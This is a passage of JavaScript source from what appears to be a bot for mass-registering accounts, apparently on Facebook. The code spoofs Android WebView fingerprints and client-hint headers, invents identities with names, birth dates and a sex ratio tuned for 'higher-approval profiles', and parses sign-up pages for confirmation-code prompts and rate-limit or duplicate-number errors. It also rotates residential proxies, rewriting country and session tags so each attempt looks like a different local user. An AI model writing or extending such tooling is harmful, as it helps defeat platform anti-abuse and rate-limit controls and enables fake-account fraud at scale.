  [360, 640, 2.0], [360, 780, 2.0], [360, 800, 2.0],
  [393, 851, 2.75], [412, 846, 2.625], [412, 915, 2.625],
  [414, 896, 3.0], [428, 926, 3.0], [720, 1560, 2.0],
  [1080, 2340, 2.75], [1080, 2400, 2.75], [1080, 2412, 3.0],
];

const CC_LOCALE_HINTS = {
  '880': { tz: ['Asia/Dhaka', 6], langs: ['en-US,en;q=0.9', 'en-GB,en;q=0.9'] },
  '91': { tz: ['Asia/Kolkata', 5.5], langs: ['en-IN,en;q=0.9', 'en-US,en;q=0.9'] },
  '92': { tz: ['Asia/Karachi', 5], langs: ['en-US,en;q=0.9', 'en-GB,en;q=0.9'] },
  '94': { tz: ['Asia/Colombo', 5.5], langs: ['en-GB,en;q=0.9', 'en-US,en;q=0.9'] },
  '977': { tz: ['Asia/Kathmandu', 5.75], langs: ['en-US,en;q=0.9'] },
  '95': { tz: ['Asia/Yangon', 6.5], langs: ['en-US,en;q=0.9'] },
  '255': { tz: ['Africa/Dar_es_Salaam', 3], langs: ['en-GB,en;q=0.9', 'en-US,en;q=0.9'] },
  '254': { tz: ['Africa/Nairobi', 3], langs: ['en-GB,en;q=0.9', 'en-US,en;q=0.9'] },
  '256': { tz: ['Africa/Kampala', 3], langs: ['en-GB,en;q=0.9', 'en-US,en;q=0.9'] },
  '250': { tz: ['Africa/Kigali', 2], langs: ['en-GB,en;q=0.9', 'fr-FR,fr;q=0.8,en;q=0.7'] },
  '251': { tz: ['Africa/Addis_Ababa', 3], langs: ['en-US,en;q=0.9'] },
  '234': { tz: ['Africa/Lagos', 1], langs: ['en-GB,en;q=0.9', 'en-US,en;q=0.9'] },
  '233': { tz: ['Africa/Accra', 0], langs: ['en-GB,en;q=0.9', 'en-US,en;q=0.9'] },
  '225': { tz: ['Africa/Abidjan', 0], langs: ['fr-FR,fr;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '221': { tz: ['Africa/Dakar', 0], langs: ['fr-FR,fr;q=0.9,en;q=0.8'] },
  '237': { tz: ['Africa/Douala', 1], langs: ['fr-FR,fr;q=0.9,en;q=0.8'] },
  '212': { tz: ['Africa/Casablanca', 1], langs: ['fr-FR,fr;q=0.9,en;q=0.8'] },
  '213': { tz: ['Africa/Algiers', 1], langs: ['fr-FR,fr;q=0.9,en;q=0.8'] },
  '216': { tz: ['Africa/Tunis', 1], langs: ['fr-FR,fr;q=0.9,en;q=0.8'] },
  '27': { tz: ['Africa/Johannesburg', 2], langs: ['en-ZA,en;q=0.9', 'en-GB,en;q=0.9'] },
  '20': { tz: ['Africa/Cairo', 2], langs: ['en-US,en;q=0.9', 'en-GB,en;q=0.9'] },
  '62': { tz: ['Asia/Jakarta', 7], langs: ['en-US,en;q=0.9', 'id-ID,id;q=0.9,en;q=0.8'] },
  '60': { tz: ['Asia/Kuala_Lumpur', 8], langs: ['en-MY,en;q=0.9', 'en-US,en;q=0.9'] },
  '65': { tz: ['Asia/Singapore', 8], langs: ['en-SG,en;q=0.9', 'en-US,en;q=0.9'] },
  '63': { tz: ['Asia/Manila', 8], langs: ['en-PH,en;q=0.9', 'en-US,en;q=0.9'] },
  '84': { tz: ['Asia/Ho_Chi_Minh', 7], langs: ['en-US,en;q=0.9', 'en-GB,en;q=0.9'] },
  '66': { tz: ['Asia/Bangkok', 7], langs: ['en-US,en;q=0.9', 'en-GB,en;q=0.9'] },
  '855': { tz: ['Asia/Phnom_Penh', 7], langs: ['en-US,en;q=0.9'] },
  '90': { tz: ['Europe/Istanbul', 3], langs: ['tr-TR,tr;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '966': { tz: ['Asia/Riyadh', 3], langs: ['en-US,en;q=0.9', 'en-GB,en;q=0.9'] },
  '971': { tz: ['Asia/Dubai', 4], langs: ['en-AE,en;q=0.9', 'en-US,en;q=0.9'] },
  '44': { tz: ['Europe/London', 0], langs: ['en-GB,en;q=0.9'] },
  '33': { tz: ['Europe/Paris', 1], langs: ['fr-FR,fr;q=0.9,en;q=0.8', 'en-GB,en;q=0.9'] },
  '49': { tz: ['Europe/Berlin', 1], langs: ['de-DE,de;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '34': { tz: ['Europe/Madrid', 1], langs: ['es-ES,es;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '39': { tz: ['Europe/Rome', 1], langs: ['it-IT,it;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '48': { tz: ['Europe/Warsaw', 1], langs: ['pl-PL,pl;q=0.9,en;q=0.8', 'en-GB,en;q=0.9'] },
  '31': { tz: ['Europe/Amsterdam', 1], langs: ['nl-NL,nl;q=0.9,en;q=0.8', 'en-GB,en;q=0.9'] },
  '380': { tz: ['Europe/Kyiv', 2], langs: ['uk-UA,uk;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '7': { tz: ['Europe/Moscow', 3], langs: ['ru-RU,ru;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '55': { tz: ['America/Sao_Paulo', -3], langs: ['pt-BR,pt;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '52': { tz: ['America/Mexico_City', -6], langs: ['es-MX,es;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '57': { tz: ['America/Bogota', -5], langs: ['es-CO,es;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '61': { tz: ['Australia/Sydney', 10], langs: ['en-AU,en;q=0.9'] },
  '1': { tz: ['America/New_York', -5], langs: ['en-US,en;q=0.9'] },
};

const TIMEZONES = [
  ['Asia/Dhaka', 6], ['Asia/Kolkata', 5.5], ['Asia/Karachi', 5],
  ['Asia/Jakarta', 7], ['Asia/Kuala_Lumpur', 8], ['Asia/Manila', 8],
  ['Asia/Bangkok', 7], ['Africa/Lagos', 1], ['Africa/Cairo', 2],
  ['Africa/Nairobi', 3], ['Africa/Dar_es_Salaam', 3], ['Europe/London', 0],
  ['America/New_York', -5],
];

const LANGUAGES = [
  'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-IN,en;q=0.9', 'en-PH,en;q=0.9',
];

const ANDROID_VERSIONS = ['10', '11', '12', '13', '14', '15'];
const CHROME_MAJOR_VERSIONS = [125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142];
const BUILD_IDS = ['TP1A', 'TKQ1', 'SQ3A', 'TQ3A', 'UP1A', 'SP1A', 'RP1A', 'RKQ1', 'SKQ1'];
const WEBGL_RENDERERS = [
  ['Adreno (TM) 650', 'Qualcomm'], ['Adreno (TM) 660', 'Qualcomm'],
  ['Adreno (TM) 730', 'Qualcomm'], ['Adreno (TM) 740', 'Qualcomm'],
  ['Mali-G76', 'ARM'], ['Mali-G77', 'ARM'], ['Mali-G78', 'ARM'],
  ['Mali-G710', 'ARM'], ['Mali-G715', 'ARM'],
];

const pickRand = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randInt = (min, max) => min + Math.floor(Math.random() * (max - min + 1));

function buildFingerprint(cc = '') {
  const [model, brand, _buildDev, devAndroid] = pickRand(ANDROID_DEVICES);
  const androidVer = devAndroid || pickRand(ANDROID_VERSIONS);
  const chromeMajor = pickRand(CHROME_MAJOR_VERSIONS);
  const chromeBuild = randInt(5800, 7100);
  const chromePatch = randInt(40, 210);
  const chromeFull = `${chromeMajor}.0.${chromeBuild}.${chromePatch}`;
  const buildId = `${pickRand(BUILD_IDS)}.${randInt(100000, 990000)}.${String(randInt(1, 99)).padStart(3, '0')}`;

  const ua =
    `Mozilla/5.0 (Linux; Android ${androidVer}; ${model} Build/${buildId}; wv) ` +
    `AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 ` +
    `Chrome/${chromeFull} Mobile Safari/537.36`;

  const [sw, sh, dpr] = pickRand(SCREEN_PROFILES);
  const hint = CC_LOCALE_HINTS[String(cc || '').replace(/\D/g, '')];
  const [tzIana, tzOffset] = hint ? hint.tz : pickRand(TIMEZONES);
  const langHeader = hint ? pickRand(hint.langs) : pickRand(LANGUAGES);
  const [glVendor, glVendorFull] = pickRand(WEBGL_RENDERERS);

  const pringer = crypto
    .createHash('sha256')
    .update(`${model}-${sw}x${sh}-${glVendor}-${chromeFull}`)
    .digest('hex')
    .slice(0, 32);

  const navHeaders = {
    'User-Agent': ua,
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': langHeader,
    'sec-ch-ua': `"Chromium";v="${chromeMajor}", "Not(A:Brand";v="24", "Android WebView";v="${chromeMajor}"`,
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': `"${model}"`,
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': `"${androidVer}.0.0"`,
    'sec-ch-prefers-color-scheme': Math.random() < 0.5 ? 'light' : 'dark',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-dest': 'document',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    dnt: '1',
    priority: 'u=0, i',
  };

  const xhrHeaders = {
    'User-Agent': ua,
    Accept: '*/*',
    'Accept-Language': langHeader,
    'sec-ch-ua': navHeaders['sec-ch-ua'],
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': `"${model}"`,
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': `"${androidVer}.0.0"`,
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    dnt: '1',
    priority: 'u=1, i',
  };

  return {
    model,
    brand,
    buildId,
    androidVer,
    chromeMajor: String(chromeMajor),
    chromeFull,
    ua,
    sw,
    sh,
    dpr,
    timezone: tzIana,
    tzOffset,
    langHeader,
    glVendor,
    glVendorFull,
    pringer,
    headers: navHeaders,
    xhrHeaders,
  };
}

function generateIdentity(cc = '') {
  const cleanCc = String(cc || '').replace(/\D/g, '');
  const isF = Math.random() < 0.25; // matches bot.py bias towards higher-approval profiles while staying varied
  const rFirsts = REGION_FIRST_NAMES[cleanCc];
  const rLasts = REGION_LAST_NAMES[cleanCc];
  const first = rFirsts
    ? pickRand(rFirsts)
    : isF
    ? pickRand(FIRST_F)
    : pickRand(FIRST_NAMES_POOL);
  let last = rLasts ? pickRand(rLasts) : pickRand(LAST_N);
  if (Math.random() < 0.2) {
    const last2 = rLasts ? pickRand(rLasts) : pickRand(LAST_N);
    if (last2 !== last) last = `${last} ${last2}`;
  }
  const by = randInt(1995, 2005);
  const bm = randInt(1, 12);
  const maxDay = [1, 3, 5, 7, 8, 10, 12].includes(bm)
    ? 31
    : bm === 2
    ? (by % 4 === 0 && (by % 100 !== 0 || by % 400 === 0) ? 29 : 28)
    : 30;
  const bd = randInt(1, maxDay);
  const sex = isF ? '1' : '2';
  return { first, last, name: `${first} ${last}`, by, bm, bd, sex };
}

const CONFIRM_WORDS = [
  'confirmation code', 'enter the code', 'confirm your phone',
  'confirmphone', 'confirmemail', 'sent you a code', 'confirm your number',
  'confirm your mobile', 'enter the 5-digit code', 'code sent to',
];

const WRONG_CODE_WORDS = [
  'incorrect', 'wrong', 'invalid code', "doesn't match",
  "didn't match", 'not valid', 'expired', 'try entering the code again',
];

// Carefully phrased so signup-page "Already have an account?" login link NEVER false-triggers
const ERR_WORDS = [
  ['already registered', 'USED'],
  ['already an account associated', 'USED'],
  ['existing account associated', 'USED'],
  ['already been registered', 'USED'],
  ['already been used', 'USED'],
  ['already taken', 'USED'],
  ['phone number you entered is already', 'USED'],
  ['already has an account', 'USED'],
  ['there is an existing account', 'USED'],
  ['too many', 'LIMIT'],
  ['try again later', 'LIMIT'],
  ['reached the limit', 'LIMIT'],
  ['temporarily blocked', 'LIMIT'],
  ['valid phone', 'BADNUM'],
  ['valid number', 'BADNUM'],
  ['valid mobile', 'BADNUM'],
  ['different number', 'BADNUM'],
  ['please enter a valid', 'BADNUM'],
  ["isn't valid", 'BADNUM'],
  ['invalid number', 'BADNUM'],
  ['not a valid', 'BADNUM'],
  ["couldn't create your account", 'FAIL'],
  ["wasn't created", 'FAIL'],
  ['please choose a password', 'FAIL'],
];

const OTP_FIELDS = ['code', 'sms_code', 'pin', 'approvals_code', 'c', 'n'];
const SKIP_HINTS = ['skip', 'not now', 'not, now', 'later', 'remind me'];

const LITE_UA =
  'Mozilla/5.0 (Linux; Android 13; SM-A546E Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36';
const DESKTOP_UA =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

const COOKIE_ORDER = ['datr', 'sb', 'm_pixel_ratio', 'wd', 'c_user', 'fr', 'xs'];

function orderCookies(jar) {
  const out = {};
  for (const k of COOKIE_ORDER) {
    if (jar && jar[k] !== undefined && jar[k] !== '') out[k] = jar[k];
  }
  for (const [k, v] of Object.entries(jar || {})) {
    if (!COOKIE_ORDER.includes(k) && v !== undefined && v !== '') out[k] = v;
  }
  return out;
}

function formatCookieHeader(jar) {
  return Object.entries(orderCookies(jar))
    .map(([k, v]) => `${k}=${v}`)
    .join('; ');
}

function randTok(bytes = 8) {
  return crypto.randomBytes(bytes).toString('base64url');
}

function freshSb() {
  return `${randTok(8)}-${randTok(6)}`;
}

function printerId() {
  return crypto.randomBytes(16).toString('hex');
}

function jazoest(lsd) {
  if (!lsd) return DEFAULT_GQL_JAZOEST;
  let sum = 0;
  for (let i = 0; i < lsd.length; i++) {
    sum += lsd.charCodeAt(i);
  }
  return `2${sum}`;
}

async function sleepAbort(ms, shouldAbort) {
  const end = Date.now() + Math.max(0, ms);
  while (Date.now() < end) {
    if (shouldAbort && shouldAbort()) return false;
    await new Promise((r) => setTimeout(r, Math.min(250, Math.max(10, end - Date.now()))));
  }
  return true;
}

function appendDebugLog(msg) {
  const ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
  const line = `[${ts}] ${msg}`;
  try {
    fs.appendFileSync(FILES.debugLog, line + '\n', 'utf-8');
  } catch {
    // ignore
  }
  return line;
}

async function checkCurlAvailable() {
  return new Promise((resolve) => {
    try {
      const child = spawn('curl', ['--version'], { shell: false });
      const chunks = [];
      child.stdout.on('data', (c) => chunks.push(c));
      child.on('error', () => resolve({ ok: false, version: 'missing' }));
      child.on('close', (code) => {
        const firstLine = Buffer.concat(chunks).toString('utf-8').split(/\r?\n/)[0] || '';
        resolve({ ok: code === 0, version: firstLine.trim() || (code === 0 ? 'ok' : 'missing') });
      });
    } catch {
      resolve({ ok: false, version: 'missing' });
    }
  });
}

function escapeHtml(s) {
  return String(s || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function csvCell(val) {
  const s = String(val ?? '');
  const safe = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
  return `"${safe.replace(/"/g, '""')}"`;
}

// ----------------------------------------------------------------------------
// 3. Proxy Parsing, Health Scoring, Rotation, Probing & HTTP/2 Curl Transport
// ----------------------------------------------------------------------------
const proxyHealth = new Map();
const dynamicProxyTagBlacklist = new Set();

function randomSessionToken(len = 10) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const bytes = crypto.randomBytes(len);
  let out = '';
  for (let i = 0; i < len; i++) {
    out += chars[bytes[i] % chars.length];
  }
  return out;
}

function proxyHealthKey(proxyUrl) {
  if (!proxyUrl) return '';
  try {
    const u = new URL(proxyUrl);
    if (u.username) {
      const dec = decodeURIComponent(u.username)
        .replace(/([_-](?:ssid|session|sessid|ses|sid|sticky)[_-])[A-Za-z0-9]{1,32}/gi, '$1*')
        .replace(/([_-](?:country|cc|region|cnt)[_-])[a-zA-Z]{2}/gi, '$1*')
        .replace(/(__cr\.)[a-zA-Z]{2}/gi, '$1*')
        .replace(/[_-]city[_-][A-Za-z0-9_]+(?=[_-]|$)/gi, '')
        .replace(/([_-]sst[_-])\d+/gi, '$1*');
      return `${u.protocol}//${dec}@${u.host}`;
    }
    return `${u.protocol}//${u.host}`;
  } catch {
    return String(proxyUrl);
  }
}

const KNOWN_ROTATING_PROXY_HOSTS = [
  'niceproxy', '9proxy', 'iproyal', 'oxylabs', 'brightdata', 'superproxy',
  'lunaproxy', 'smartproxy', 'decodo', 'abcproxy', 'pyproxy', '360proxy',
  'tabproxy', 'piaproxy', 'packetstream', 'soax', 'geonode', 'dataimpulse',
  'proxy-seller', 'proxycheap', 'lightningproxies', 'nodemaven', 'proxyempire',
  'floxy', 'cherryproxy', 'resproxy', 'mobileproxy',
];

function inspectProxyCapabilities(proxyUrl) {
  const out = {
    hasCountryTag: false,
    countryCode: '',
    hasCityTag: false,
    city: '',
    hasSessionTag: false,
    sessionId: '',
    hasSst: false,
    sst: '',
    isNiceProxy: false,
    isRotatingGateway: false,
  };
  if (!proxyUrl) return out;
  try {
    const u = new URL(proxyUrl);
    const hostLow = (u.hostname || '').toLowerCase();
    out.isNiceProxy = hostLow.includes('niceproxy') || hostLow.includes('9proxy');
    const user = decodeURIComponent(u.username || '');
    const mc =
      user.match(/[_-](?:country|cc|region|cnt)[_-]([a-zA-Z]{2})(?=[_-]|$)/i) ||
      user.match(/(?:country|cc|region)[=:]([a-zA-Z]{2})(?=[;&,\-_]|$)/i) ||
      user.match(/__cr\.([a-zA-Z]{2})(?=[._;\-]|$)/i);
    if (mc) {
      out.hasCountryTag = true;
      out.countryCode = mc[1].toUpperCase();
    }
    const mcity = user.match(/[_-]city[_-]([A-Za-z0-9_]+)(?=[_-]|$)/i) || user.match(/city[=:]([A-Za-z0-9_]+)(?=[;&,\-_]|$)/i);
    if (mcity) {
      out.hasCityTag = true;
      out.city = mcity[1];
    }
    const ms =
      user.match(/[_-](?:ssid|session|sessid|ses|sid|sticky)[_-]([A-Za-z0-9]{1,32})(?=[_-]|$)/i) ||
      user.match(/(?:ssid|session|sessid|ses|sid|sticky)[=:]([A-Za-z0-9]{1,32})(?=[;&,\-_]|$)/i);
    if (ms) {
      out.hasSessionTag = true;
      out.sessionId = ms[1];
    }
    const msst = user.match(/[_-]sst[_-](\d+)(?=[_-]|$)/i);
    if (msst) {
      out.hasSst = true;
      out.sst = msst[1];
    }
    out.isRotatingGateway =
      KNOWN_ROTATING_PROXY_HOSTS.some((h) => hostLow.includes(h)) ||
      out.hasCountryTag ||
      out.hasSessionTag ||
      out.hasCityTag ||
      out.hasSst ||
      /([_-](?:zone|state|life|lifetime|res|mobile|asn)[_-]|\{(?:iso|country|ssid|session)\})/i.test(user);
  } catch {
    // ignore
  }
  return out;
}

function adaptProxyForSession(proxyUrl, opts = {}) {
  const raw = String(proxyUrl || '').trim();
  if (!raw) {
    return {
      url: null,
      isoApplied: '',
      sessionId: '',
      countryChanged: false,
      sessionRefreshed: false,
      cityCleared: false,
      countryInjected: false,
      sessionInjected: false,
    };
  }
  if (dynamicProxyTagBlacklist.has(proxyHealthKey(raw)) && !opts.forceDynamicTags) {
    return {
      url: raw,
      isoApplied: '',
      sessionId: '',
      countryChanged: false,
      sessionRefreshed: false,
      cityCleared: false,
      countryInjected: false,
      sessionInjected: false,
    };
  }
  try {
    const u = new URL(raw);
    let user = decodeURIComponent(u.username || '');
    const origUser = user;
    const origCap = inspectProxyCapabilities(raw);
    const hostLow = (u.hostname || '').toLowerCase();
    const targetIsoUpper = String(opts.iso || '').trim().toUpperCase();
    const targetIso = targetIsoUpper.toLowerCase();
    let isoApplied = '';
    let sessionId = '';
    let countryChanged = false;
    let sessionRefreshed = false;
    let cityCleared = false;
    let countryInjected = false;
    let sessionInjected = false;

    const isoForTok = /^[a-z]{2}$/.test(targetIso) ? targetIso : (origCap.countryCode || '').toLowerCase().slice(0, 2);
    const nextTok = opts.forcedSessionId || `${isoForTok}${randomSessionToken(isoForTok ? 8 : 10)}`;

    // Placeholder syntax support: e.g. user-country-{iso}-ssid-{ssid}
    if (user && /\{(?:iso|country|ssid|session|rnd)\}/i.test(user)) {
      if (/^[a-z]{2}$/.test(targetIso)) {
        user = user
          .replace(/\{iso\}|\{country\}/g, targetIso)
          .replace(/\{ISO\}|\{COUNTRY\}/g, targetIsoUpper);
        isoApplied = targetIsoUpper;
        countryChanged = true;
      }
      if (/\{(?:ssid|session|rnd)\}/i.test(user)) {
        user = user.replace(/\{(?:ssid|session|rnd)\}/gi, nextTok);
        sessionId = nextTok;
        sessionRefreshed = true;
      }
    }

    if (opts.autoCountry !== false && /^[a-z]{2}$/.test(targetIso) && user) {
      const prevIsoUpper = origCap.countryCode || '';
      const actuallyDifferent = !prevIsoUpper || prevIsoUpper !== targetIsoUpper;

      const next1 = user.replace(
        /([_-](?:country|cc|region|cnt)[_-])([a-zA-Z]{2})(?=[_-]|$)/gi,
        (_, p1, prevCode) => `${p1}${prevCode === prevCode.toUpperCase() ? targetIsoUpper : targetIso}`
      );
      const next2 = next1.replace(
        /((?:country|cc|region)[=:])([a-zA-Z]{2})(?=[;&,\-_]|$)/gi,
        (_, p1, prevCode) => `${p1}${prevCode === prevCode.toUpperCase() ? targetIsoUpper : targetIso}`
      );
      const next3 = next2.replace(
        /(__cr\.)([a-zA-Z]{2})(?=[._;\-]|$)/gi,
        (_, p1, prevCode) => `${p1}${prevCode === prevCode.toUpperCase() ? targetIsoUpper : targetIso}`
      );
      if (next3 !== user) {
        user = next3;
        isoApplied = targetIsoUpper;
        countryChanged = actuallyDifferent;
      } else if (!/country|__cr\.|-cc-|_cc-|-region-/i.test(user)) {
        const allowInject = origCap.isRotatingGateway || opts.allowGenericInject !== false;
        if (allowInject) {
          if (hostLow.includes('dataimpulse')) {
            user = `${user}__cr.${targetIso}`;
          } else if (hostLow.includes('iproyal') || (/_(?:session|lifetime|city)[_-]/i.test(user) && !/-/.test(user))) {
            user = /([_-](?:ssid|session|sessid|ses|sid|sticky)[_-])/i.test(user)
              ? user.replace(/([_-](?:ssid|session|sessid|ses|sid|sticky)[_-])/i, `_country-${targetIso}$1`)
              : `${user}_country-${targetIso}`;
          } else if (/([_-](?:ssid|session|sessid|ses|sid|sticky)[_-])/i.test(user)) {
            user = user.replace(/([_-](?:ssid|session|sessid|ses|sid|sticky)[_-])/i, `-country-${targetIso}$1`);
          } else {
            user = `${user}-country-${targetIso}`;
          }
          isoApplied = targetIsoUpper;
          countryChanged = true;
          countryInjected = !origCap.isNiceProxy && !origCap.isRotatingGateway;
        }
      }

      // CRITICAL: Country and city must match for 9Proxy/NiceProxy to succeed!
      // If country switched and no city override for that country was provided, remove mismatched -city-xxx tag.
      if (actuallyDifferent && !opts.city && origCap.hasCityTag) {
        const strippedCity = user
          .replace(/([_-])city[_-][A-Za-z0-9_]+(?=[_-]|$)/gi, '')
          .replace(/(?:^|[;&,])city[=:][A-Za-z0-9_]+/gi, '');
        if (strippedCity !== user) {
          user = strippedCity;
          cityCleared = true;
        }
      }
      if (opts.city) {
        const cleanCity = String(opts.city).trim().toLowerCase().replace(/[^a-z0-9_]/g, '');
        if (cleanCity) {
          if (/[_-]city[_-][A-Za-z0-9_]+/i.test(user)) {
            user = user.replace(/([_-]city[_-])[A-Za-z0-9_]+/i, `$1${cleanCity}`);
          } else if (/([_-](?:country|cc)[_-][a-z]{2})/i.test(user)) {
            user = user.replace(/([_-](?:country|cc)[_-][a-z]{2})/i, `$1-city-${cleanCity}`);
          }
        }
      }
    }

    if (opts.refreshSession && user) {
      const next1 = user.replace(/([_-](?:ssid|session|sessid|ses|sid|sticky)[_-])([A-Za-z0-9]{1,32})(?=[_-]|$)/gi, (_, p1) => `${p1}${nextTok}`);
      const next2 = next1.replace(/((?:ssid|session|sessid|ses|sid|sticky)[=:])([A-Za-z0-9]{1,32})(?=[;&,\-_]|$)/gi, (_, p1) => `${p1}${nextTok}`);
      if (next2 !== next1 || next1 !== user) {
        user = next2;
        sessionId = nextTok;
        sessionRefreshed = true;
      } else if (origCap.isRotatingGateway || /[_-](?:country|cc)[_-][a-z]{2}/i.test(user)) {
        if (/([_-]sst[_-]\d+)/i.test(user)) {
          user = user.replace(/([_-]sst[_-]\d+)/i, `-ssid-${nextTok}$1`);
        } else if (hostLow.includes('iproyal') || (/_country-[a-z]{2}/i.test(user) && !/-/.test(user))) {
          user = `${user}_session-${nextTok}`;
        } else {
          user = `${user}-ssid-${nextTok}`;
        }
        sessionId = nextTok;
        sessionRefreshed = true;
        sessionInjected = !origCap.isNiceProxy && !origCap.isRotatingGateway;
      }
    }

    if (user !== origUser) {
      u.username = user;
    }
    const finalCap = inspectProxyCapabilities(u.toString());
    if (!isoApplied) isoApplied = finalCap.countryCode;
    if (!sessionId) sessionId = finalCap.sessionId;

    return {
      url: u.toString().replace(/\/$/, ''),
      isoApplied,
      sessionId,
      countryChanged,
      sessionRefreshed,
      cityCleared,
      countryInjected,
      sessionInjected,
    };
  } catch {
    return {
      url: raw,
      isoApplied: '',
      sessionId: '',
      countryChanged: false,
      sessionRefreshed: false,
      cityCleared: false,
      countryInjected: false,
      sessionInjected: false,
    };
  }
}

function recordProxyHealth(proxyUrl, ok, latencyMs = 0, meta = {}) {
  if (!proxyUrl) return;
  const key = proxyHealthKey(proxyUrl);
  const prev = proxyHealth.get(key) || {
    okCount: 0,
    failCount: 0,
    streakFail: 0,
    lastLatencyMs: 0,
    exitIp: '',
    blockedUntil: 0,
    lastErr: '',
  };
  if (ok) {
    prev.okCount += 1;
    prev.streakFail = 0;
    if (latencyMs > 0) prev.lastLatencyMs = latencyMs;
    prev.blockedUntil = 0;
    prev.lastErr = '';
    if (meta.exitIp) prev.exitIp = meta.exitIp;
  } else {
    prev.failCount += 1;
    prev.streakFail += 1;
    if (meta.err) prev.lastErr = meta.err;
    if (prev.streakFail >= 2) {
      prev.blockedUntil = Date.now() + 90 * 1000;
    }
  }
  proxyHealth.set(key, prev);
}

function selectSmartProxy(pool, index, badProxies, mode = 'rotate', fallback = null) {
  const now = Date.now();
  const candidates = (pool || []).filter(
    (p) => (!badProxies || !badProxies.has(p) && !badProxies.has(proxyHealthKey(p))) && ((proxyHealth.get(proxyHealthKey(p))?.blockedUntil || 0) <= now)
  );
  const active = candidates.length > 0 ? candidates : (pool || []).filter((p) => !badProxies || (!badProxies.has(p) && !badProxies.has(proxyHealthKey(p))));
  if (active.length === 0) {
    const all = pool || [];
    if (all.length > 0) return all[index % all.length];
    return fallback || null;
  }
  if (mode === 'random') {
    return active[Math.floor(Math.random() * active.length)];
  }
  if (mode === 'fastest') {
    const scored = [...active].sort((a, b) => {
      const ha = proxyHealth.get(proxyHealthKey(a));
      const hb = proxyHealth.get(proxyHealthKey(b));
      const sa = (ha?.failCount || 0) * 800 + (ha?.lastLatencyMs || 1500) - (ha?.okCount || 0) * 150;
      const sb = (hb?.failCount || 0) * 800 + (hb?.lastLatencyMs || 1500) - (hb?.okCount || 0) * 150;
      return sa - sb;
    });
    return scored[index % Math.min(3, scored.length)];
  }
  return active[index % active.length];
}

function isValidPort(p) {
  if (!/^\d{1,5}$/.test(String(p))) return false;
  const n = Number(p);
  return n >= 1 && n <= 65535;
}

function validateProxyUrl(raw) {
  let s = (raw || '').trim();
  if (!s || /[\r\n\0]/.test(s)) return null;
  s = s.replace(/^\d{1,4}[.)]\s+/, '').trim();
  if (!s || /\s/.test(s)) return null;
  if (/^\d{1,5}$/.test(s)) return null;

  let scheme = 'http://';
  let rest = s;
  const schemeMatch = s.match(/^([a-zA-Z][a-zA-Z0-9+.-]*:\/\/)(.*)$/);
  if (schemeMatch) {
    const proto = schemeMatch[1].toLowerCase();
    if (!['http://', 'https://', 'socks4://', 'socks4a://', 'socks5://', 'socks5h://'].includes(proto)) {
      return null;
    }
    scheme = proto;
    rest = schemeMatch[2].replace(/\/+$/, '');
  }

  let candidate = '';
  if (rest.includes('@')) {
    const atIdx = rest.lastIndexOf('@');
    const left = rest.slice(0, atIdx);
    const right = rest.slice(atIdx + 1);
    const leftParts = left.split(':');
    const rightParts = right.split(':');
    if (
      leftParts.length === 2 &&
      isValidPort(leftParts[1]) &&
      rightParts.length >= 2 &&
      !isValidPort(rightParts[rightParts.length - 1])
    ) {
      const user = rightParts[0];
      const pass = rightParts.slice(1).join(':');
      candidate = `${scheme}${encodeURIComponent(user)}:${encodeURIComponent(pass)}@${leftParts[0]}:${leftParts[1]}`;
    } else {
      candidate = `${scheme}${rest}`;
    }
  } else {
    const parts = rest.split(':');
    if (parts.length === 4 && isValidPort(parts[3])) {
      const [user, pass, host, port] = parts;
      if (!host) return null;
      candidate = `${scheme}${encodeURIComponent(user)}:${encodeURIComponent(pass)}@${host}:${port}`;
    } else if (parts.length === 4 && isValidPort(parts[1])) {
      const [host, port, user, pass] = parts;
      if (!host) return null;
      candidate = `${scheme}${encodeURIComponent(user)}:${encodeURIComponent(pass)}@${host}:${port}`;
    } else if (parts.length === 2 && isValidPort(parts[1])) {
      candidate = `${scheme}${parts[0]}:${parts[1]}`;
    } else {
      candidate = `${scheme}${rest}`;
    }
  }

  try {
    const u = new URL(candidate);
    if (!['http:', 'https:', 'socks4:', 'socks4a:', 'socks5:', 'socks5h:'].includes(u.protocol)) {
      return null;
    }
    if (!u.hostname || !u.hostname.includes('.')) {
      if (u.hostname !== 'localhost') return null;
    }
    if (u.port && !isValidPort(u.port)) return null;
    return u.toString().replace(/\/$/, '');
  } catch {
    return null;
  }
}

function parseProxyLines(raw) {
  const out = [];
  const seen = new Set();
  for (const line of (raw || '').split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const normalized = validateProxyUrl(trimmed);
